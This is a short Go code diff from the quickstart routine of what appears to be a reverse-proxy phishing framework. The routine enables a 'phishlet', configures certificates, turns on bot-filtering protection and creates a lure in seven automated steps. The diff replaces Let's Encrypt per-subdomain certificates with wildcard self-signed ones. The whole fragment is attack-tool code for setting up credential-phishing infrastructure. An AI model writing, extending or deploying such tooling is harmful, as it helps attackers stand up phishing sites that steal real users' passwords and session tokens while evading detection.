@@ -286,10 +286,10 @@ func (t *Terminal) handleQuickstart(args []string) error {
 		log.Warning("could not detect IP — set manually: config ipv4 external <IP>")
 	}
 
-	// 3. Ensure autocert enabled (Let's Encrypt HTTP-01 for trusted certs)
-	log.Info("[3/7] enabling Let's Encrypt certificates (trusted by browsers)")
+	// 3. Enable wildcard self-signed certificates (works with all subdomains)
+	log.Info("[3/7] enabling wildcard certificates")
 	t.cfg.EnableAutocert(true)
-	t.cfg.EnableWildcardTLS(false) // HTTP-01 per-subdomain certs (no browser warnings)
+	t.cfg.EnableWildcardTLS(true) // Wildcard self-signed cert covers all subdomains
 
 	// 4. Enable botguard with sensible defaults
 	log.Info("[4/7] enabling botguard protection")
@@ -315,9 +315,9 @@ func (t *Terminal) handleQuickstart(args []string) error {
 	t.cfg.SetSiteHostname(phishlet, hostname)
 
 	// 6. Enable phishlet and get certificates
-	log.Info("[6/7] enabling phishlet and obtaining Let's Encrypt certificates...")
+	log.Info("[6/7] enabling phishlet and generating certificates...")
 	t.cfg.SetSiteEnabled(phishlet)
-	t.manageCertificates(true) // Get real Let's Encrypt certs (may take up to 60 seconds)
+	t.manageCertificates(true) // Generate wildcard self-signed certs (instant)
 
 	// 7. Create lure
 	log.Info("[7/7] creating lure...")
